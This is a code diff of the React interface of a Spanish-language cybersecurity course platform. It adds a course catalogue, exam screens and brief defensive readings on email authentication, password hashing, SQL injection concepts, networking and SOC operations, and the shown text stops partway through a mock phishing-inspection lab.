+                    <span className="hidden md:inline text-slate-200 font-bold">{userProfile.name}</span>
+                  </div>
+                ) : (
+                  <button
+                    onClick={() => { setAuthMode('login'); setShowAuthModal(true); }}
+                    className="px-3.5 py-1.5 bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-mono font-bold text-xs rounded-md transition flex items-center gap-1.5 shadow"
+                  >
+                    👤 Iniciar Sesión
+                  </button>
+                )}
+              </div>
+
             </div>
           </header>
 
-          {/* VISTA 1: PANTALLA DE BIENVENIDA */}
           {viewMode === 'welcome' && (
-            <div className="max-w-4xl mx-auto my-auto p-6 text-center space-y-6">
-              <div className="inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full bg-cyan-500/10 border border-cyan-500/30 text-cyan-400 text-xs font-mono">
-                ⚡ Creado en 1 solo archivo HTML (Funciona sin servidor ni Node.js)
-              </div>
-              <h1 className="text-3xl md:text-5xl font-extrabold text-white">
-                Simulador Interactivo de <span className="text-cyan-400">Ciberseguridad & Defensa</span>
-              </h1>
-              <p className="text-slate-400 text-sm md:text-base max-w-2xl mx-auto leading-relaxed">
-                Inspecciona encabezados de correo Phishing, simula ataques de Fuerza Bruta en tiempo real, rompe autenticaciones con Inyección SQL y prueba ataques DOM XSS.
-              </p>
+            <div className="max-w-6xl mx-auto p-6 md:p-12 space-y-12 my-auto">
+              <div className="text-center space-y-4 py-8">
+                <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-xs font-mono">
+                  ✨ Cisco NetAcad &amp; CyberOps Certified Path
+                </div>
+                <h1 className="text-3xl md:text-6xl font-black text-white tracking-tight">
+                  Domina la Ciberseguridad al <span className="text-transparent bg-clip-text bg-gradient-to-r from-emerald-400 via-teal-300 to-cyan-400">Ritmo de tu Propio Ritmo</span>
+                </h1>
+                <p className="text-slate-400 text-sm md:text-base max-w-2xl mx-auto leading-relaxed">
+                  Plataforma interactiva con cursos teóricos estructurados estilo Cisco, laboratorios de análisis SMTP y SQL, y exámenes de certificación con retroalimentación diagnóstica en tiempo real.
+                </p>
 
-              <div className="flex justify-center gap-4 pt-4 font-mono text-sm">
-                <button 
-                  onClick={() => setViewMode('lab')} 
-                  className="px-6 py-3 bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-bold rounded-xl shadow-lg shadow-cyan-500/20 transition"
-                >
-                  ▶ Abrir Laboratorio Interactivo
-                </button>
-                <button 
-                  onClick={() => setViewMode('ai')} 
-                  className="px-6 py-3 bg-slate-900 hover:bg-slate-800 border border-slate-700 text-purple-300 font-bold rounded-xl transition"
-                >
-                  🤖 Consultor de Seguridad
-                </button>
+                <div className="flex flex-wrap justify-center gap-4 pt-4">
+                  <button
+                    onClick={() => setViewMode('courses')}
+                    className="px-8 py-3.5 bg-gradient-to-r from-emerald-500 to-teal-500 hover:from-emerald-400 hover:to-teal-400 text-slate-950 font-mono font-bold text-sm rounded-lg transition shadow-lg shadow-emerald-500/25 flex items-center gap-2"
+                  >
+                    📚 Ver Catálogo de Cursos ({coursesCatalog.length})
+                  </button>
+                  <button
+                    onClick={() => { setAuthMode('register'); setShowAuthModal(true); }}
+                    className="px-8 py-3.5 bg-slate-900 hover:bg-slate-800 border border-slate-700 text-slate-200 font-mono font-bold text-sm rounded-lg transition flex items-center gap-2"
+                  >
+                    📝 Registrarse Gratis
+                  </button>
+                </div>
+              </div>
+
+              <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
+                {coursesCatalog.slice(0, 3).map((course) => (
+                  <div key={course.id} className="bg-slate-900 border border-slate-800 rounded-xl p-6 space-y-4 flex flex-col justify-between hover:border-emerald-500/50 transition">
+                    <div className="space-y-3">
+                      <div className="flex justify-between items-center text-xs font-mono">
+                        <span className="text-emerald-400 font-bold">{course.category}</span>
+                        <span className="px-2 py-0.5 rounded bg-slate-800 text-slate-300">Dificultad: {course.difficulty}</span>
+                      </div>
+                      <h3 className="text-base font-bold text-white">{course.title}</h3>
+                      <p className="text-xs text-slate-400 leading-relaxed">{course.description}</p>
+                    </div>
+
+                    <div className="pt-4 border-t border-slate-800 flex justify-between items-center">
+                      <span className="text-xs font-mono text-slate-500">⏱️ {course.time}</span>
+                      <button
+                        onClick={() => handleStartCourse(course.id)}
+                        className="px-4 py-2 bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-300 text-xs font-mono font-bold rounded border border-emerald-500/30 transition flex items-center gap-1.5"
+                      >
+                        Iniciar Curso ➔
+                      </button>
+                    </div>
+                  </div>
+                ))}
               </div>
             </div>
           )}
 
-          {/* VISTA 2: LABORATORIO Y SIMULADORES */}
-          {viewMode === 'lab' && (
+          {viewMode === 'courses' && (
             <div className="max-w-7xl w-full mx-auto p-4 md:p-6 grid grid-cols-1 lg:grid-cols-12 gap-6 flex-1">
               
-              {/* Barra Lateral Módulos */}
-              <div className="lg:col-span-3 space-y-3 font-mono">
-                <div className="text-xs text-slate-400 uppercase tracking-widest px-1">Selecciona un Módulo:</div>
-                <button 
+              <aside className="lg:col-span-4 space-y-4">
+                <div className="text-xs font-mono text-slate-400 uppercase tracking-widest px-1">
+                  Catálogo de Cursos Activos ({coursesCatalog.length})
+                </div>
+
+                <div className="space-y-3">
+                  {coursesCatalog.map((course) => {
+                    const isSelected = activeModule === course.id;
+                    const progress = courseProgress[course.id] || 0;
+
+                    return (
+                      <div
+                        key={course.id}
+                        onClick={() => handleStartCourse(course.id)}
+                        className={`p-4 rounded-xl border transition cursor-pointer space-y-3 ${
+                          isSelected 
+                            ? 'bg-slate-900 border-emerald-500/50 shadow-lg shadow-emerald-500/5 ring-1 ring-emerald-500/30' 
+                            : 'bg-slate-900/50 border-slate-800 hover:bg-slate-900'
+                        }`}
+                      >
+                        <div className="flex justify-between items-center text-xs font-mono">
+                          <span className={`px-2 py-0.5 rounded ${
+                            course.difficulty === 'Básico' ? 'bg-cyan-500/10 text-cyan-300 border border-cyan-500/30' :
+                            course.difficulty === 'Intermedio' ? 'bg-amber-500/10 text-amber-300 border border-amber-500/30' :
+                            'bg-rose-500/10 text-rose-300 border border-rose-500/30'
+                          }`}>
+                            Dificultad: {course.difficulty}
+                          </span>
+                          <span className="text-slate-400 font-mono">⏱️ {course.time}</span>
+                        </div>
+
+                        <div>
+                          <h3 className={`text-sm font-bold ${isSelected ? 'text-emerald-300' : 'text-slate-100'}`}>
+                            {course.title}
+                          </h3>
+                          <p className="text-xs text-slate-400 line-clamp-2 mt-1">{course.description}</p>
+                        </div>
+
+                        <div className="space-y-1 pt-1">
+                          <div className="flex justify-between text-[11px] font-mono text-slate-400">
+                            <span>Progreso del Estudiante</span>
+                            <span className="text-emerald-400 font-bold">{progress}%</span>
+                          </div>
+                          <div className="w-full h-1.5 bg-slate-950 rounded-full overflow-hidden border border-slate-800">
+                            <div className="h-full bg-gradient-to-r from-emerald-500 to-teal-400 transition-all duration-500" style={{ width: `${progress}%` }}></div>
+                          </div>
+                        </div>
+                      </div>
+                    );
+                  })}
+                </div>
+              </aside>
+
+              <main className="lg:col-span-8 space-y-6">
+                
+                <div className="bg-slate-900 border border-slate-800 rounded-xl p-5 space-y-4">
+                  <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-800 pb-3">
+                    <div className="flex items-center gap-3">
+                      <div className="p-2.5 bg-emerald-500/10 border border-emerald-500/30 rounded-lg text-emerald-400">
+                        📖
+                      </div>
+                      <div>
+                        <h2 className="text-base font-bold text-white font-mono">
+                          {courseDocuments[activeModule]?.title}
+                        </h2>
+                        <p className="text-xs text-slate-400">Currículo Académico Oficial &amp; Laboratorios Guiados</p>
+                      </div>
+                    </div>
+                    <span className="px-3 py-1 bg-emerald-500/20 text-emerald-300 border border-emerald-500/40 rounded-full font-mono text-xs font-bold">
+                      {courseProgress[activeModule] || 0}% Completado
+                    </span>
+                  </div>
+
+                  <div className="space-y-2 font-sans text-xs">
+                    {(courseDocuments[activeModule]?.submodules || []).map((item) => {
+                      const isSubActive = activeCourseDoc === item.id;
+                      return (
+                        <div
+                          key={item.id}
+                          onClick={() => {
+                            setActiveCourseDoc(item.id);
+                            setCourseProgress(prev => ({
+                              ...prev,
+                              [activeModule]: Math.max(prev[activeModule] || 0, 60)
+                            }));
+                          }}
+                          className={`flex items-center justify-between p-3.5 rounded-lg border transition cursor-pointer ${
+                            isSubActive
+                              ? 'bg-slate-800/90 border-emerald-500/50 text-white font-bold shadow-md'
+                              : 'bg-slate-950/60 border-slate-800/80 text-slate-300 hover:bg-slate-800/50'
+                          }`}
+                        >
+                          <div className="flex items-center gap-3">
+                            <div className={`w-7 h-7 rounded-full border flex items-center justify-center transition ${
+                              isSubActive ? 'border-emerald-400 text-emerald-400 bg-emerald-500/10' : 'border-slate-700 text-slate-500'
+                            }`}>
+                              ▶
+                            </div>
+                            <span className="text-sm">
+                              <strong className="text-slate-400 font-mono mr-1.5">{item.code}</strong> {item.title}
+                            </span>
+                          </div>
+                          <span className="font-mono text-slate-500 text-[11px]">{item.count}</span>
+                        </div>
+                      );
+                    })}
+                  </div>
+                </div>
+
+                <div className="bg-slate-900 border border-slate-800 rounded-xl p-6 md:p-8 space-y-6">
+                  
+                  {activeCourseDoc.includes('quiz') ? (
+                    <div className="space-y-6">
+                      <div className="border-b border-slate-800 pb-4 flex items-center justify-between">
+                        <div>
+                          <h3 className="text-lg font-bold text-white font-mono flex items-center gap-2">
+                            🏆 Examen Final de Certificación: {courseDocuments[activeModule]?.title}
+                          </h3>
+                          <p className="text-xs text-slate-400 mt-1">Responde las 5 preguntas. Necesitas al menos 70% para aprobar y sumar XP.</p>
+                        </div>
+                        {examSubmitted && (
+                          <span className={`px-3 py-1 rounded font-mono text-xs font-bold border ${
+                            examScore >= 70 ? 'bg-emerald-500/20 text-emerald-300 border-emerald-500/40' : 'bg-rose-500/20 text-rose-300 border-rose-500/40'
+                          }`}>
+                            Nota: {examScore}% ({examScore >= 70 ? 'APROBADO' : 'REPROBADO'})
+                          </span>
+                        )}
+                      </div>
+
+                      <div className="space-y-6 font-mono text-xs">
+                        {(moduleExams[activeModule] || []).map((q, qIdx) => (
+                          <div key={qIdx} className="bg-slate-950 p-4 rounded-lg border border-slate-800 space-y-3">
+                            <div className="font-bold text-slate-200">
+                              <span className="text-emerald-400">P{qIdx + 1}.</span> {q.q}
+                            </div>
+                            <div className="space-y-2 pl-4">
+                              {q.options.map((opt, optIdx) => {
+                                const isSelected = examAnswers[qIdx] === optIdx;
+                                const isCorrect = q.correct === optIdx;
+
+                                let style = "bg-slate-900 border-slate-800 text-slate-300 hover:border-slate-700";
+                                if (examSubmitted) {
+                                  if (isCorrect) style = "bg-emerald-500/20 border-emerald-500/50 text-emerald-200 font-bold";
+                                  else if (isSelected && !isCorrect) style = "bg-rose-500/20 border-rose-500/50 text-rose-200";
+                                } else if (isSelected) {
+                                  style = "bg-emerald-500/20 border-emerald-500/50 text-emerald-200 font-bold";
+                                }
+
+                                return (
+                                  <div
+                                    key={optIdx}
+                                    onClick={() => !examSubmitted && setExamAnswers({ ...examAnswers, [qIdx]: optIdx })}
+                                    className={`p-2.5 rounded border transition cursor-pointer flex items-center justify-between ${style}`}
+                                  >
+                                    <span>{opt}</span>
+                                    {examSubmitted && isCorrect && <span>✅</span>}
+                                    {examSubmitted && isSelected && !isCorrect && <span>❌</span>}
+                                  </div>
+                                );
+                              })}
+                            </div>
+
+                            {examSubmitted && (
+                              <div className={`p-3 rounded text-[11px] leading-relaxed ${
+                                examAnswers[qIdx] === q.correct ? 'bg-emerald-950/40 border border-emerald-500/30 text-emerald-300' : 'bg-rose-950/40 border border-rose-500/30 text-rose-300'
+                              }`}>
+                                <strong>Explicación:</strong> {q.explanation}
+                              </div>
+                            )}
+                          </div>
+                        ))}
+                      </div>
+
+                      {!examSubmitted ? (
+                        <div className="flex justify-end pt-4">
+                          <button
+                            onClick={handleExamSubmit}
+                            className="px-6 py-2.5 bg-amber-500 hover:bg-amber-400 text-slate-950 font-mono font-bold text-xs rounded transition flex items-center gap-2"
+                          >
+                            ✔️ Enviar Examen Final
+                          </button>
+                        </div>
+                      ) : (
+                        <div className="p-4 bg-slate-950 rounded-lg border border-slate-800 space-y-3 text-xs font-mono">
+                          <div className="font-bold text-slate-100">📋 Informe de Diagnóstico y Recomendación de Refuerzo:</div>
+                          {examScore >= 70 ? (
+                            <p className="text-emerald-400">¡Felicitaciones! Has demostrado dominio técnico en este módulo. Tu puntaje ha sido registrado y se han acreditado +150 XP a tu perfil.</p>
+                          ) : (
+                            <p className="text-rose-400">Has obtenido {examScore}%. Para superar el umbral del 70%, te sugerimos repasar las lecturas teóricas de este curso antes de volver a intentarlo.</p>
+                          )}
+                          <button
+                            onClick={() => { setExamSubmitted(false); setExamAnswers({}); }}
+                            className="px-4 py-2 bg-slate-800 hover:bg-slate-700 text-slate-200 rounded text-xs font-bold flex items-center gap-1.5"
+                          >
+                            🔄 Reintentar Examen
+                          </button>
+                        </div>
+                      )}
+                    </div>
+                  ) : (
+                    <div className="space-y-6 text-slate-200 leading-relaxed font-sans text-sm">
+                      <div className="border-b border-slate-800 pb-4 flex items-center justify-between">
+                        <div className="flex items-center gap-2 text-xs font-mono text-emerald-400">
+                          <span>📖 LECTURA TÉCNICA // {activeCourseDoc.toUpperCase()}</span>
+                        </div>
+                        <span className="text-xs font-mono text-slate-400 bg-slate-800 px-3 py-1 rounded-full">
+                          ⏱️ 12 min de lectura guiada
+                        </span>
+                      </div>
+
+                      {/* --- CONTENIDO DIFERENCIADO POR CADA SUBMÓDULO --- */}
+                      
+                      {/* PHISHING SUBMODULES */}
+                      {activeCourseDoc === 'p_intro' && (
+                        <div className="space-y-4">
+                          <h2 className="text-2xl font-bold text-white tracking-tight">1.0 Introducción a la seguridad del correo y SMTP</h2>
+                          <p>El protocolo Simple Mail Transfer Protocol (SMTP) fue diseñado originalmente sin mecanismos de autenticación nativos, permitiendo que cualquier usuario en el puerto 25 transmita mensajes declarando un remitente falso.</p>
+                          <div className="bg-slate-950 p-4 rounded-lg border border-slate-800 font-mono text-xs text-cyan-300">
+                            MAIL FROM: &lt;ceo@empresa.com&gt; // Sin verificación criptográfica original
+                          </div>
+                        </div>
+                      )}
+
+                      {activeCourseDoc === 'p_threats' && (
+                        <div className="space-y-4">
+                          <h2 className="text-2xl font-bold text-white tracking-tight">1.1 Ingeniería Social y Typosquatting</h2>
+                          <p>El Typosquatting aprovecha errores tipográficos comunes en los nombres de dominio (ejemplo: <code>paypa1.com</code> o <code>micros0ft.com</code>) para engañar a los usuarios y capturar credenciales de acceso en páginas espejo idénticas.</p>
+                        </div>
+                      )}
+
+                      {activeCourseDoc === 'p_auth' && (
+                        <div className="space-y-4">
+                          <h2 className="text-2xl font-bold text-white tracking-tight">1.2 Autenticación Criptográfica (SPF, DKIM y DMARC)</h2>
+                          <p>Para solucionar las deficiencias de SMTP, se utilizan tres estándares combinados:</p>
+                          <ul className="list-disc pl-5 space-y-2 text-slate-300">
+                            <li><strong>SPF:</strong> Publica en el DNS qué direcciones IP están autorizadas a enviar correos.</li>
+                            <li><strong>DKIM:</strong> Firma digitalmente el contenido con un par de llaves criptográficas RSA.</li>
+                            <li><strong>DMARC:</strong> Indica al servidor receptor qué acción tomar si SPF o DKIM fallan (monitoreo, cuarentena o rechazo <code>p=reject</code>).</li>
+                          </ul>
+                        </div>
+                      )}
+
+                      {activeCourseDoc === 'p_passkeys' && (
+                        <div className="space-y-4">
+                          <h2 className="text-2xl font-bold text-white tracking-tight">1.3 Autenticación FIDO2 / Passkeys e Identidad</h2>
+                          <p>Las Passkeys reemplazan las contraseñas tradicionales mediante criptografía asimétrica ligada estrictamente al origen del sitio web, volviendo inútiles los ataques de phishing tradicionales dado que un sitio falso no puede replicar la firma del dominio legítimo.</p>
+                        </div>
+                      )}
+
+                      {/* PASSWORDS SUBMODULES */}
+                      {activeCourseDoc === 'pass_intro' && (
+                        <div className="space-y-4">
+                          <h2 className="text-2xl font-bold text-white tracking-tight">2.0 Introducción a la Entropía Criptográfica</h2>
+                          <p>La entropía mide la aleatoriedad y resistencia de una contraseña frente a la adivinación automatizada, calculada en bits mediante la fórmula: <code>E = L × log2(R)</code>.</p>
+                        </div>
+                      )}
+
+                      {activeCourseDoc === 'pass_hashes' && (
+                        <div className="space-y-4">
+                          <h2 className="text-2xl font-bold text-white tracking-tight">2.1 Limitaciones de MD5 y SHA-256</h2>
+                          <p>MD5 y SHA-256 son algoritmos optimizados para alta velocidad de cálculo. Esta característica los hace nefastos para claves, ya que una GPU moderna puede evaluar miles de millones de hashes por segundo.</p>
+                        </div>
+                      )}
+
+                      {activeCourseDoc === 'pass_kdf' && (
+                        <div className="space-y-4">
+                          <h2 className="text-2xl font-bold text-white tracking-tight">2.2 Funciones KDF Lentas: Bcrypt y Argon2id</h2>
+                          <p>Argon2id y Bcrypt introducen un costo deliberado de memoria RAM y tiempo de procesamiento CPU, neutralizando la ventaja de hardware especializado de los atacantes.</p>
+                        </div>
+                      )}
+
+                      {activeCourseDoc === 'pass_salts' && (
+                        <div className="space-y-4">
+                          <h2 className="text-2xl font-bold text-white tracking-tight">2.3 Salting Criptográfico y Defensa ante GPUs</h2>
+                          <p>Añadir una cadena aleatoria única (Salt) antes de aplicar el hash impide el uso de tablas precalculadas (Rainbow Tables).</p>
+                        </div>
+                      )}
+
+                      {/* SQLI SUBMODULES */}
+                      {activeCourseDoc === 'sql_intro' && (
+                        <div className="space-y-4">
+                          <h2 className="text-2xl font-bold text-white tracking-tight">3.0 Introducción al Parser SQL y Concatenación</h2>
+                          <p>La inyección SQL ocurre cuando los datos de entrada del usuario se tratan como código ejecutable debido a la concatenación directa de cadenas.</p>
+                        </div>
+                      )}
+
+                      {activeCourseDoc === 'sql_ast' && (
+                        <div className="space-y-4">
+                          <h2 className="text-2xl font-bold text-white tracking-tight">3.1 Alteración del Árbol Sintáctico Abstracto (AST)</h2>
+                          <p>Al introducir caracteres como comillas simples (<code>'</code>), el atacante altera la estructura lógica del Árbol Sintáctico Abstracto del motor de base de datos.</p>
+                        </div>
+                      )}
+
+                      {activeCourseDoc === 'sql_types' && (
+                        <div className="space-y-4">
+                          <h2 className="text-2xl font-bold text-white tracking-tight">3.2 Tipos de SQLi: Union-Based, Blind y Time-Based</h2>
+                          <p>Existen variantes como <em>Union-Based</em> (para extraer datos visibles directamente) y <em>Blind SQLi</em> (cuando la base de datos no retorna errores ni resultados visuales).</p>
+                        </div>
+                      )}
+
+                      {activeCourseDoc === 'sql_prep' && (
+                        <div className="space-y-4">
+                          <h2 className="text-2xl font-bold text-white tracking-tight">3.3 Consultas Preparadas (Parameterized Queries)</h2>
+                          <p>Las consultas preparadas separan la estructura SQL de los datos, garantizando que el motor jamás interprete los inputs como instrucciones de código.</p>
+                        </div>
+                      )}
+
+                      {/* NETWORKING SUBMODULES */}
+                      {activeCourseDoc === 'net_intro' && (
+                        <div className="space-y-4">
+                          <h2 className="text-2xl font-bold text-white tracking-tight">4.0 Modelo OSI vs TCP/IP en Inspección</h2>
+                          <p>Los firewalls modernos analizan desde la capa de enlace hasta la capa de aplicación para detectar anomalías de tráfico y patrones de ataque.</p>
+                        </div>
+                      )}
+
+                      {activeCourseDoc === 'net_handshake' && (
+                        <div className="space-y-4">
+                          <h2 className="text-2xl font-bold text-white tracking-tight">4.1 Handshake TCP de 3 Vías e Inspección Stateful</h2>
+                          <p>El intercambio SYN, SYN-ACK y ACK establece la sesión de red permitiendo al firewall mantener tablas de estado de conexiones activas.</p>
+                        </div>
+                      )}
+
+                      {activeCourseDoc === 'net_vlan' && (
+                        <div className="space-y-4">
+                          <h2 className="text-2xl font-bold text-white tracking-tight">4.2 Segmentación de Redes, VLANs y ACLs Cisco</h2>
+                          <p>Las listas de control de acceso (ACL) y VLANs aíslan segmentos críticos impidiendo movimientos laterales de atacantes en la red interna.</p>
+                        </div>
+                      )}
+
+                      {activeCourseDoc === 'net_tls' && (
+                        <div className="space-y-4">
+                          <h2 className="text-2xl font-bold text-white tracking-tight">4.3 Cifrado en Tránsito con TLS 1.3 y VPNs IPSec</h2>
+                          <p>TLS 1.3 agiliza el cifrado extremo a extremo reduciendo el intercambio a 1-RTT y eliminando protocolos criptográficos vulnerables.</p>
+                        </div>
+                      )}
+
+                      {/* SOC SUBMODULES */}
+                      {activeCourseDoc === 'soc_intro' && (
+                        <div className="space-y-4">
+                          <h2 className="text-2xl font-bold text-white tracking-tight">5.0 Arquitectura y Flujo de Trabajo en un SOC</h2>
+                          <p>El Centro de Operaciones de Seguridad opera bajo marcos de triaje continuo de alertas, mitigación y análisis forense digital.</p>
+                        </div>
+                      )}
+
+                      {activeCourseDoc === 'soc_siem' && (
+                        <div className="space-y-4">
+                          <h2 className="text-2xl font-bold text-white tracking-tight">5.1 Monitoreo de Telemetría e Ingesta SIEM</h2>
+                          <p>Los sistemas SIEM recopilan logs centralizados de servidores, firewalls y endpoints para correlacionar eventos sospechosos en tiempo real.</p>
+                        </div>
+                      )}
+
+                      {activeCourseDoc === 'soc_yara' && (
+                        <div className="space-y-4">
+                          <h2 className="text-2xl font-bold text-white tracking-tight">5.2 Reglas YARA y Análisis de Artefactos Malware</h2>
+                          <p>YARA permite definir patrones de texto y secuencias hexadecimales para identificar y clasificar familias de malware de forma automatizada.</p>
+                        </div>
+                      )}
+
+                      {activeCourseDoc === 'soc_triage' && (
+                        <div className="space-y-4">
+                          <h2 className="text-2xl font-bold text-white tracking-tight">5.3 Fases de Contención y Erradicación de Amenazas</h2>
+                          <p>Incluye la desconexión aislada de equipos afectados, revocación de credenciales comprometidas y restauración desde respaldos limpios.</p>
+                        </div>
+                      )}
+
+                      <div className="pt-6 border-t border-slate-800 flex justify-between items-center">
+                        <span className="text-xs text-slate-400 font-mono">¿Listo para poner a prueba tus conocimientos?</span>
+                        <button
+                          onClick={() => setViewMode('labs')}
+                          className="px-5 py-2.5 bg-gradient-to-r from-emerald-500 to-teal-500 hover:from-emerald-400 hover:to-teal-400 text-slate-950 font-bold rounded text-xs font-mono transition flex items-center gap-2 shadow"
+                        >
+                          🧪 Ir al Laboratorio Práctico
+                        </button>
+                      </div>
+                    </div>
+                  )}
+
+                </div>
+              </main>
+
+            </div>
+          )}
+
+          {viewMode === 'labs' && (
+            <div className="max-w-7xl w-full mx-auto p-4 md:p-6 grid grid-cols-1 lg:grid-cols-12 gap-6 flex-1">
+              
+              <aside className="lg:col-span-3 space-y-3">
+                <div className="text-xs font-mono text-slate-400 uppercase tracking-widest px-1">
+                  Laboratorios Interactivos de Práctica
+                </div>
+                
+                <button
                   onClick={() => setActiveModule('phishing')}
-                  className={`w-full text-left p-3 rounded-xl border transition ${activeModule === 'phishing' ? 'bg-slate-900 border-cyan-500/50 text-cyan-300' : 'bg-slate-900/40 border-slate-800 text-slate-400'}`}
+                  className={`w-full text-left p-3.5 rounded-xl border transition flex items-center gap-3 ${
+                    activeModule === 'phishing' ? 'bg-slate-900 border-cyan-500 text-cyan-300 font-bold shadow-lg shadow-cyan-500/5' : 'bg-slate-900/40 border-slate-800 text-slate-300 hover:bg-slate-900'
+                  }`}
                 >
-                  <div className="font-bold text-sm">1. Phishing & Encabezados</div>
-                  <div className="text-xs text-slate-500 mt-0.5">Inspección SMTP + DMARC</div>
+                  <span className="p-2 bg-cyan-500/10 rounded-lg">✉️</span>
+                  <div>
+                    <div className="text-sm">1. Phishing &amp; SMTP</div>
+                    <div className="text-[11px] text-slate-400 font-normal">Auditoría de cabeceras en vivo</div>
+                  </div>
                 </button>
 
-                <button 
+                <button
+                  onClick={() => setActiveModule('passwords')}
+                  className={`w-full text-left p-3.5 rounded-xl border transition flex items-center gap-3 ${
+                    activeModule === 'passwords' ? 'bg-slate-900 border-amber-500 text-amber-300 font-bold shadow-lg shadow-amber-500/5' : 'bg-slate-900/40 border-slate-800 text-slate-300 hover:bg-slate-900'
+                  }`}
+                >
+                  <span className="p-2 bg-amber-500/10 rounded-lg">🔑</span>
+                  <div>
+                    <div className="text-sm">2. Entropía &amp; Hash</div>
+                    <div className="text-[11px] text-slate-400 font-normal">Simulador de Crackeo GPU</div>
+                  </div>
+                </button>
+
+                <button
                   onClick={() => setActiveModule('sqli')}
-                  className={`w-full text-left p-3 rounded-xl border transition ${activeModule === 'sqli' ? 'bg-slate-900 border-cyan-500/50 text-cyan-300' : 'bg-slate-900/40 border-slate-800 text-slate-400'}`}
+                  className={`w-full text-left p-3.5 rounded-xl border transition flex items-center gap-3 ${
+                    activeModule === 'sqli' ? 'bg-slate-900 border-rose-500 text-rose-300 font-bold shadow-lg shadow-rose-500/5' : 'bg-slate-900/40 border-slate-800 text-slate-300 hover:bg-slate-900'
+                  }`}
                 >
-                  <div className="font-bold text-sm">2. Inyección SQL (SQLi)</div>
-                  <div className="text-xs text-slate-500 mt-0.5">Bypass de Autenticación</div>
+                  <span className="p-2 bg-rose-500/10 rounded-lg">🗄️</span>
+                  <div>
+                    <div className="text-sm">3. Inyección SQL (AST)</div>
+                    <div className="text-[11px] text-slate-400 font-normal">Motor de consultas inyectadas</div>
+                  </div>
                 </button>
 
-                <button 
-                  onClick={() => setActiveModule('xss')}
-                  className={`w-full text-left p-3 rounded-xl border transition ${activeModule === 'xss' ? 'bg-slate-900 border-cyan-500/50 text-cyan-300' : 'bg-slate-900/40 border-slate-800 text-slate-400'}`}
+                <button
+                  onClick={() => setActiveModule('soc')}
+                  className={`w-full text-left p-3.5 rounded-xl border transition flex items-center gap-3 ${
+                    activeModule === 'soc' ? 'bg-slate-900 border-purple-500 text-purple-300 font-bold shadow-lg shadow-purple-500/5' : 'bg-slate-900/40 border-slate-800 text-slate-300 hover:bg-slate-900'
+                  }`}
                 >
-                  <div className="font-bold text-sm">3. DOM XSS & Cookies</div>
-                  <div className="text-xs text-slate-500 mt-0.5">Inyección de Scripts</div>
+                  <span className="p-2 bg-purple-500/10 rounded-lg">📡</span>
+                  <div>
+                    <div className="text-sm">4. Operaciones SOC SIEM</div>
+                    <div className="text-[11px] text-slate-400 font-normal">Triaje de alertas y contención</div>
+                  </div>
                 </button>
+
+                <div className="mt-6 border border-slate-800 rounded-xl bg-slate-900/80 p-3.5 text-xs font-mono shadow-inner">
+                  <div className="flex items-center justify-between border-b border-slate-800 pb-2 mb-2 text-slate-400">
+                    <span className="flex items-center gap-1.5 text-cyan-400">💻 Consola Telemetría SecOps</span>
+                    <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
+                  </div>
+                  <div className="space-y-1.5 max-h-48 overflow-y-auto pr-1 text-[11px]">
+                    {terminalLogs.map((log, idx) => (
+                      <div key={idx} className="leading-relaxed border-b border-slate-900/50 pb-1">
+                        <span className="text-slate-500">[{log.time}]</span> <span className={log.type === 'success' ? 'text-emerald-400 font-bold' : log.type === 'warn' ? 'text-amber-400 font-bold' : 'text-cyan-300'}>{log.text}</span>
+                      </div>
+                    ))}
+                  </div>
+                </div>
+              </aside>
+
+              <main className="lg:col-span-9 bg-slate-900 border border-slate-800 rounded-xl p-6 md:p-8 space-y-6 shadow-2xl">
+                <div className="flex flex-wrap justify-between items-center border-b border-slate-800 pb-4 gap-4">
+                  <div>
+                    <div className="inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full bg-cyan-500/10 border border-cyan-500/30 text-cyan-400 text-[11px] font-mono mb-1">
+                      ⚡ Laboratorio Activo en Tiempo Real
+                    </div>
+                    <h2 className="text-xl font-bold text-white font-mono flex items-center gap-2">
+                      Simulador Avanzado: {activeModule.toUpperCase()}
+                    </h2>
+                    <p className="text-xs text-slate-400">Interactúa con los controles, prueba vectores de ataque y valida contramedidas defensivas.</p>
+                  </div>
+                  <button
+                    onClick={() => setViewMode('courses')}
+                    className="px-4 py-2 bg-slate-800 hover:bg-slate-700 text-xs font-mono text-slate-200 rounded-lg border border-slate-700 transition flex items-center gap-1.5 shadow"
+                  >
+                    📖 Volver al Currículo Teórico
+                  </button>
+                </div>
+
+                {activeModule === 'phishing' && (
+                  <div className="space-y-6 font-mono text-xs">
+                    <div className="p-5 bg-slate-950 border border-slate-800 rounded-xl space-y-4">
+                      <div className="flex items-center justify-between text-cyan-400 font-bold text-sm border-b border-slate-800 pb-3">
+                        <span className="flex items-center gap-2">✉️ Centro de Inspección de Correos y Filtros SPF/DMARC</span>
+                        <span className="text-xs px-2 py-1 rounded bg-slate-900 text-slate-300">Bandeja de Entrada (2 Mensajes)</span>
+                      </div>
+                      
+                      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                        <div className="p-4 bg-slate-900 rounded-xl border border-rose-500/30 space-y-3 relative overflow-hidden">
+                          <div className="absolute top-0 right-0 bg-rose-500/20 text-rose-300 px-3 py-1 text-[10px] font-bold border-l border-b border-rose-500/40 rounded-bl">
+                            ALERTA PHISHING
+                          </div>
+                          <div className="font-bold text-slate-200 text-sm">Correo #1 (Sospechoso)</div>
+                          <div className="space-y-1.5 text-slate-300">
+                            <div><span className="text-slate-500">From:</span> soporte@banco-seguro-verificacion.com</div>
+                            <div><span className="text-slate-500">IP Origen:</span> 185.220.101.5 (Desconocida / Tor Exit Node)</div>
+                            <div><span className="text-slate-500">SPF Status:</span> <span className="text-rose-400 font-bold">FAIL (IP no autorizada)</span></div>
+                            <div><span className="text-slate-500">DKIM Signature:</span> <span className="text-rose-400 font-bold">MISSING / INVÁLIDA</span></div>
+                            <div><span className="text-slate-500">DMARC Policy:</span> <span className="text-amber-400 font-bold">p=none (Solo reporte)</span></div>
+                          </div>
+                          <button 
+                            onClick={() => addLog('ANÁLISIS COMPLETADO: Correo 1 mitigado exitosamente. IP maliciosa aislada en el gateway SMTP.', 'success')}
